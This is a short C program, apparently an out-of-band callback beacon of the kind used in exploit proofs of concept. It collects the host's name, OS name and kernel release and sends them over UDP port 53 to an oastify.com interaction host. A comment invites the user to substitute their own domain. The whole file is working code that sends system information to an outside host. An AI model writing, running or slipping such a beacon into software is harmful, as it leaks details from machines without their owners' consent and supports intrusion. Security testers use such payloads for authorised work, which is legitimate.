#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/utsname.h>
#include <netdb.h>      // For getaddrinfo()
#include <string.h>     // For memset()

int main() {
    int s = socket(AF_INET, SOCK_DGRAM, 0); // Use constants for clarity
    if (s < 0) {
        // Handle socket error (e.g., perror("socket"));
        return 1;
    }

    char *hostname = "mndfzrycz4c7ga9qiffsfj1klbr2ft9hy.oastify.com";  // Replace with your domain
    char port_str[] = "53";        // Port as string for getaddrinfo

    struct addrinfo hints, *res;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_protocol = IPPROTO_UDP;

    int err = getaddrinfo(hostname, port_str, &hints, &res);
    if (err != 0) {
        // Handle resolution error
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(err));
        close(s);
        return 1;
    }

    // Assume first result is usable (IPv4 UDP); in production, loop over res if needed
    struct sockaddr *addr = res->ai_addr;
    socklen_t addrlen = res->ai_addrlen;

    char n[64], b[128];
    struct utsname u;
    gethostname(n, sizeof(n));
    uname(&u);
    snprintf(b, sizeof(b), "R:%s,O:%s %s", n, u.sysname, u.release);

    ssize_t sent = sendto(s, b, strlen(b), 0, addr, addrlen);
    if (sent < 0) {
        // Handle sendto error (e.g., perror("sendto"));
    }

    freeaddrinfo(res);
    close(s);
    return 0;
}
